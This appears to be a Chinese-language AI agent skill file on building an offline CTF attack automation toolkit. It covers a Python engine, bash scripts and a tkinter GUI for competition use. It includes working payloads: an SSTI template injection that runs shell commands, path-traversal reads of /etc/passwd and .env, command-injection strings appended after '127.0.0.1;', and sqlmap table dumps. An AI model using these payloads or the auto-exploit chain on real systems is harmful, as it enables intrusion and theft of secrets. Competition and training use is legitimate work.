---
name: ctf-automation-toolkit
description: "构建离线CTF攻防自动化工具包 — Python引擎串联漏洞检测/利用/Flag提取, bash脚本覆盖全题型, tkinter GUI一键操作。适用于隔离网络竞赛。"
tags: [ctf, automation, toolkit, engine, gui, offline, vulnerability-detection]
---

# CTF 自动化工具包构建

## 触发条件

用户提到: CTF工具包、离线渗透工具、自动化攻击引擎、CTF GUI、内网攻防工具、一键攻击。

先加载:
- `ctf-playbook` — 解题思路/payload速查
- `pentest-tool-mastery` — 工具选型
- `exploit-chain` — 攻击链模式
- 本技能: 工具包架构/引擎设计/GUI构建

## 架构设计

### 工具包结构

```
ctf-toolkit/
├── engine.py          # Python自动化引擎(核心)
├── ctf.sh             # CLI主入口(路由)
├── gui/ctf_gui.py     # tkinter GUI
├── web/               # Web攻击脚本(10+)
├── crypto/            # 密码学工具(4)
├── pwn/               # 二进制利用(4)
├── reverse/           # 逆向分析(3)
├── misc/              # 取证/隐写(5)
├── recon/             # 侦察(4)
├── defense/           # 防御(4)
├── scripts/           # 自动化编排(3)
├── payloads/          # Payload模板库
├── wordlists/         # 离线字典
└── loot/              # 战利品输出
```

### Python引擎设计 (engine.py, v6 — 1462行, 29插件)

核心原则: 不是脚本集合,是智能编排系统。

```python
# 模块类
class Recon:        # 网络侦察 (masscan→nmap→HTTP发现→指纹)
class Discovery:    # 端点发现 (路径爆破+爬虫+JS路由提取)
class Crawler:      # 智能爬虫 (链接+表单+参数+JS API路由)
class SvcExploit:   # 服务利用 (Redis/MySQL/FTP/MongoDB/Memcached/ES/Docker/K8s/PostgreSQL/SSH)
class FlagHunter:   # Flag提取 (本地文件+环境变量+数据库文件+战利品)
class Defense:      # AWD防御 (webshell扫描+文件完整性)

# 29个漏洞插件 (@register装饰器自动注册)
# Web: SQLi/CMDi/LFI/SSTI/XSS/IDOR/GraphQL/SSRF/JWT/CORS/Upload/AuthBypass
# 高级: XXE/RaceCondition/WAFDetect/SubdomainEnum/CredRelay/SSRFBlind/IDORAdv/GQLAdv
# 检测: InfoLeak/SensitiveFile/Deserialization/NoSQLi/CSRF/FrameworkExploit/HostHeader

class Engine:       # 主引擎: 串联所有模块
    def run(self):
        # Phase 1: 网络侦察 (masscan全端口→nmap服务版本→HTTP发现)
        # Phase 2: 服务利用 (按服务类型分发, Docker/K8s API探测)
        # Phase 3: Web攻击 (每个HTTP服务)
        #   3a: 端点发现 (路径爆破+爬虫)
        #   3b: 指纹识别
        #   3c: 漏洞检测+自动利用 (29个插件)
        # Phase 4: Flag提取 (8个搜索路径+环境变量+数据库文件)
```

## 关键实现模式

### HTTP请求: 用urllib不用curl子进程

**PITFALL**: 用subprocess调curl传递特殊字符('";{}[])会shell转义出错。

```python
# 正确: 直接用urllib
import urllib.request
def _curl(url, timeout=5):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.read().decode(errors="ignore")
    except Exception as e:
        return str(e)

# 错误: subprocess调curl
# sh(f"curl -sk '{url}'")  # 单引号内有'会断裂
```

**PITFALL**: urllib.parse.quote编码后传给urllib.request.urlopen不会双重编码——这是安全的。但不要手动拼接后再encode。

### 端点发现: 先扫描再测试

漏洞检测必须先发现活跃端点,不能直接用根URL测试:

```python
VULN_PATHS = [
    '/sqli', '/search', '/query', '/user', '/login',
    '/cmdi', '/cmd', '/ping', '/exec', '/diagnostic',
    '/lfi', '/include', '/file', '/page', '/load',
    '/ssti', '/template', '/render', '/greeting',
    '/xss', '/search', '/comment', '/feedback',
    '/upload', '/api/upload',
]

def discover_endpoints(url):
    found = []
    for path in VULN_PATHS:
        resp = _curl(f'{url}{path}', 3)
        if len(resp) > 100 and '404' not in resp[:100].lower():
            found.append(path)
    return found
```

然后每个test方法接受paths参数:

```python
def test_sqli(url, loot, paths=None):
    if paths is None: paths = ["/sqli","/search","/query","/user","/"]
    for path in paths:
        for param in params:
            resp = _curl(f"{url}{path}?{param}={enc}")
```

### SQL注入错误模式

**PITFALL**: 只匹配MySQL/MSSQL/Oracle错误会漏掉SQLite。

```python
# 完整模式覆盖所有主流数据库
SQL_ERROR_RE = r"(?i)(sql syntax|mysql|ORA-|PG_|sqlite|Unclosed|"
    r"microsoft.*ODBC|error in your|SQL Error|unrecognized token|"
    r"near .{1,20}: syntax error)"
```

### 漏洞检测→自动利用→Flag提取 链条

关键: 检测到漏洞后不只报告,要自动利用:

```python
# SQLi → sqlmap自动利用 → 查flag表
if sqli_found:
    sh(f"sqlmap -u '{url}{path}?{param}=1' --batch --dbs")
    for table in ["flag","flags","secret"]:
        sh(f"sqlmap ... -T {table} --dump")

# SSTI → 自动RCE → 搜索flag
if ssti_found:
    rce = "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}"
    resp = _curl(f"{url}{path}?{param}={_urlencode(rce)}")

# LFI → 自动读敏感文件
if lfi_found:
    for f in ["/etc/passwd","/flag","/var/www/html/.env"]:
        resp = _curl(f"{url}{path}?{param}={_urlencode(f'../../../../../../{f}')}")

# CMDi → 自动执行搜索flag
if cmdi_found:
    for cmd in ["cat /flag","find / -name 'flag*'","grep -r 'flag{' /tmp"]:
        resp = _curl(f"{url}{path}?{param}={_urlencode(f'127.0.0.1;{cmd}')}")
```

### tkinter GUI设计 (v4.1架构, 659行)

**用户偏好**: 简洁实用,不花哨,功能为王。暗色主题,Consolas字体,pack布局(不混用grid)。

**关键偏好 — 绝对不要emoji图标**: 用户明确要求去除所有emoji/Unicode图标,改为纯文本大写标签。tkinter在Linux下emoji渲染为方块或乱码,极丑。用 `ATTACK` / `WEB` / `SQLi` 等纯ASCII文本代替。

#### v4.1布局结构 (无emoji, 纯文本)

```
┌─────────────────────────────────────────────────┐
│ TARGET [input]  MODE[full/fast/stealth] ATTACK STOP│  ← 顶部栏
├──────────┬──────────────────────────────────────┤
│ ATTACK   │ [OUTPUT] [VULNS] [FLAGS] [LOOT]      │  ← 右侧Notebook
│ WEB      │ ┌──────────────────────────────────┐ │
│ CRYPTO   │ │ $ python3 engine.py target       │ │
│ PWN      │ │ [output with color tags...]       │ │
│ MISC     │ │                                  │ │
│ DEFENSE  │ └──────────────────────────────────┘ │
├──────────┤ FLAG> [flag input] [Save] [快捷栏...] │
└──────────┴──────────────────────────────────────┘
```

#### 关键模式: 结构化结果面板

**漏洞面板用Treeview**,不用Text:

```python
cols = ("severity","type","path","param","confidence")
tree = ttk.Treeview(parent, columns=cols, show="headings")
for c, w, h in [("severity",8,"等级"),("type",15,"类型"),...]:
    tree.heading(c, text=h)
    tree.column(c, width=w*8)
# 颜色标签
tree.tag_configure("critical", foreground="#f85149")
tree.tag_configure("high", foreground="#d29922")
# 点击显示详情
tree.bind("<<TreeviewSelect>>", self._on_vuln_select)
```

#### 关键模式: Flag自动提取

输出中实时捕获flag,不等攻击结束:

```python
for line in iter(proc.stdout.readline, ""):
    self.app.root.after(0, lambda l=line, t=tag: self.app.log(l, t))
    # 自动提取flag
    for flag in re.findall(r"(?:flag|FLAG|ctf|CTF)\{[^}]+\}", line):
        self.app.root.after(0, lambda f=flag: self.app.auto_flag(f))
```

#### 关键模式: 攻击完成回调

一键攻击完成后自动刷新漏洞/Flag/Loot面板:

```python
def _auto_attack(self):
    cmd = ["/usr/bin/python3", ENGINE, target]
    self.exec.run(cmd, "一键攻击引擎", callback=self._on_attack_done)

def _on_attack_done(self):
    self.root.after(500, self._refresh_findings)  # 从findings.json读取
    self.root.after(500, self._scan_flags)         # 从loot/扫描flag
    self.root.after(500, self._refresh_loot)       # 刷新文件树
```

#### 关键模式: Loot浏览器

Treeview文件树 + 双击预览:

```python
tree = ttk.Treeview(parent, columns=("size","modified"), show="tree headings")
tree.heading("#0", text="文件")
tree.bind("<Double-1>", self._open_loot_file)  # 双击→预览区显示内容
```

#### 关键模式: 输出区搜索

搜索框默认隐藏,按搜索按钮展开,高亮匹配:

```python
# 搜索框默认隐藏在输出区上方
self.search_frame = tk.Frame(...)  # pack_forget() by default
def _do_search(self):
    self.txt.tag_remove("search", "1.0", "end")
    start = "1.0"
    while True:
        pos = self.txt.search(query, start, stopindex="end", nocase=True)
        if not pos: break
        self.txt.tag_add("search", pos, f"{pos}+{len(query)}c")
        start = f"{pos}+{len(query)}c"
    self.txt.tag_configure("search", background="#58a6ff", foreground="#000")
```

#### 关键模式: 引擎选项面板

Checkbutton + Entry 控制engine.py参数:

```python
self.var_web_only = tk.BooleanVar()
tk.Checkbutton(g, text="仅Web", variable=self.var_web_only,
               bg=C["bg"], fg=C["fg"], selectcolor=C["bg3"]).pack()

def _auto_attack(self):
    cmd = ["/usr/bin/python3", ENGINE, target]
    if self.cb_mode.get() != "full":
        cmd.extend(["--mode", self.cb_mode.get()])
    if self.var_web_only.get(): cmd.append("--web-only")
    if self.var_no_brute.get(): cmd.append("--no-brute")
```

**PITFALL**: 不要混用pack和grid在同一容器内,会导致错位。选择一种布局管理器坚持使用。

**PITFALL**: ttk.Notebook.add()的text参数不要写成`text f=`(多了空格),会导致SyntaxError。

**PITFALL**: 颜色字典必须包含所有引用的键。遗漏`C["yellow"]`会导致KeyError崩溃。在写GUI时,先定义完整色盘再引用:
```python
C = {"bg":"#0d1117","bg2":"#161b22","bg3":"#21262d","fg":"#c9d1d9",
     "dim":"#8b949e","blue":"#58a6ff","green":"#3fb950","red":"#f85149",
     "orange":"#d29922","white":"#ffffff","yellow":"#e3b341","cyan":"#39d2c0"}
```

**PITFALL**: 绝对不要在tkinter按钮/标签文本中使用emoji(如⚡🚩🔍🔐💥📦🛡)。Linux下tkinter渲染emoji为方块或乱码,极丑。用纯ASCII文本: `ATTACK` / `WEB` / `SQLi` / `STOP`。

**PITFALL**: shell=False防注入。subprocess.Popen传列表时不经过shell,安全传递特殊字符:

```python
proc = subprocess.Popen(cmd, shell=isinstance(cmd, str), ...)
# 列表→shell=False, 字符串→shell=True
```

**关键**: 后台线程执行命令,避免UI冻结。用root.after(0, callback)从线程更新UI:

```python
def run(self, cmd, label="", callback=None):
    def _worker():
        proc = subprocess.Popen(cmd, shell=isinstance(cmd, str), ...)
        for line in iter(proc.stdout.readline, ""):
            self.app.root.after(0, lambda l=line: self.app.log(l))
        rc = proc.wait()
        if callback:
            self.app.root.after(100, callback)  # 攻击完成后回调
    threading.Thread(target=_worker, daemon=True).start()
```

### bash脚本设计模式

每个脚本独立可运行,接受URL/目标作为参数:

```bash
#!/bin/bash
URL="${1:?用法: bash recon.sh <URL>}"
OUTDIR="/path/to/loot/$(echo $URL | sed 's|https\?://||;s|/|_|g')"
mkdir -p "$OUTDIR"

# 输出到终端同时保存到文件
log() { echo -e "$1" | tee -a "$OUTDIR/report.txt"; }
hit() { echo -e "\033[31m[!] $1\033[0m" | tee -a "$OUTDIR/findings.txt"; }
```

## 依赖工具清单

离线环境必须预装: nmap masscan sqlmap hydra gobuster ffuf nuclei nikto
hashcat john steghide binwalk exiftool checksec ROPgadget radare2 gdb tshark

Python: pwntools requests (可选,引擎用stdlib urllib即可)

## 比赛策略

### 攻防模式 (AWD)
1. 先保护: flag-protect + patch all
2. 再攻击: engine <target> 全自动
3. 持续监控: detect + monitor

### Jeopardy模式
1. 扫描: engine <网段>
2. Web优先: web-recon → exploit
3. Misc快速: file → stego → forensics
4. 拿到flag立即提交

## 智能自动化引擎 (v7.0, SAS CTF 2026经验)

### 核心理念

用户明确要求: "这么多功能如果我一个个手动使用就会导致效率低下，需要每个功能都能被自动化使用"。解决方案是创建智能调度引擎，自动识别目标类型→自动选择工具链→自动执行→自动提取Flag。

### 引擎架构 (auto_ctf.py)

```python
class TargetType(Enum):
    WEB = "web"
    SERVICE = "service"
    BINARY = "binary"
    CRYPTO = "crypto"
    MISC = "misc"
    GAME = "game"

class DecisionEngine:
    def detect_target_type(self, target: str) -> TargetType:
        # http:// → WEB
        # IP/域名 → SERVICE
        # ELF/PE → BINARY
        # .enc/.rsa → CRYPTO
        # .pdf/.png → MISC

    def analyze_web_target(self, url: str) -> Dict:
        # Step 1: Web侦察
        # Step 2: 敏感文件检测
        # Step 3: PDF泄露检查
        # Step 4: 根据技术栈选择测试策略
        # Step 5: WAF绕过测试
        # Step 6: 游戏API发现

class WorkflowEngine:
    def auto_solve(self, target: str) -> CTFResult:
        # 自动识别目标类型
        # 根据类型选择分析策略
        # 汇总结果
        # 保存到loot目录
```

### 新增模块

1. **WAF绕过模块** (`waf_bypass.py`) — Coraza WAF检测/UNION VALUES绕过/left-right替代substring
2. **游戏题自动化** (`game_auto.py`) — API发现/BFS寻路/Kernel生成/Sandbox限制检测
3. **主引擎插件** — `coraza_bypass`/`game_api`/`pdf_leak`

### bash集成新增命令

```bash
ctf auto-solve <target>          # 一键自动化解题
ctf batch-solve <targets.txt>    # 批量解题
ctf coraza-bypass <url> [param]  # Coraza WAF绕过
ctf game-auto <url>              # 游戏题自动化
ctf game-kernel <direction>      # 生成游戏kernel
ctf pdf-leak <url/file>          # PDF泄露检测
```

## PITFALL: bash函数必须在case语句之前定义

**严重坑**: 在ctf.sh中添加新函数时，函数定义必须放在`case "${1:-help}" in`之前。如果放在case语句之后，bash会报"未找到命令"错误。

```bash
# ✅ 正确: 函数定义在case之前
game_kernel() {
    local direction="$1"
    python "$TOOLKIT_DIR/game_auto.py" kernel "$direction"
}

case "${1:-help}" in
    game-kernel) game_kernel "${@:2}" ;;
    ...
esac

# ❌ 错误: 函数定义在case之后
case "${1:-help}" in
    game-kernel) game_kernel "${@:2}" ;;  # 找不到函数!
    ...
esac

game_kernel() {  # 太晚了
    ...
}
```

**重复定义坑**: 修改ctf.sh时容易产生重复函数定义。用`grep -c "^func_name()" ctf.sh`检查，用sed删除重复行。

## PITFALL: python3命令可能hang住

**关键环境问题**: 在某些系统上(如本机)，`/usr/local/bin/python3`会hang住无响应，但`/usr/bin/python`正常工作。

```bash
# ✅ 正确: 使用python而非python3
python "$TOOLKIT_DIR/game_auto.py" kernel "$direction"

# ❌ 错误: python3可能hang
python3 "$TOOLKIT_DIR/game_auto.py" kernel "$direction"
```

**检测方法**: `which python3 && timeout 5 python3 --version` 如果超时则改用`python`。

**内存已记录**: "python3被劫持用/usr/bin/python3" — 但实际测试中/usr/bin/python3也会hang。最可靠的是直接用`python`。

## 参考文件

- `references/engine-debug-log.md` — 引擎开发过程中的bug和修复记录
- `references/gui-v4-redesign.md` — GUI v3→v4→v4.1重设计记录(emoji教训/用户偏好)
- `references/sas-ctf-2026-automation.md` — SAS CTF 2026自动化经验 (WAF绕过/游戏题/PDF泄露)
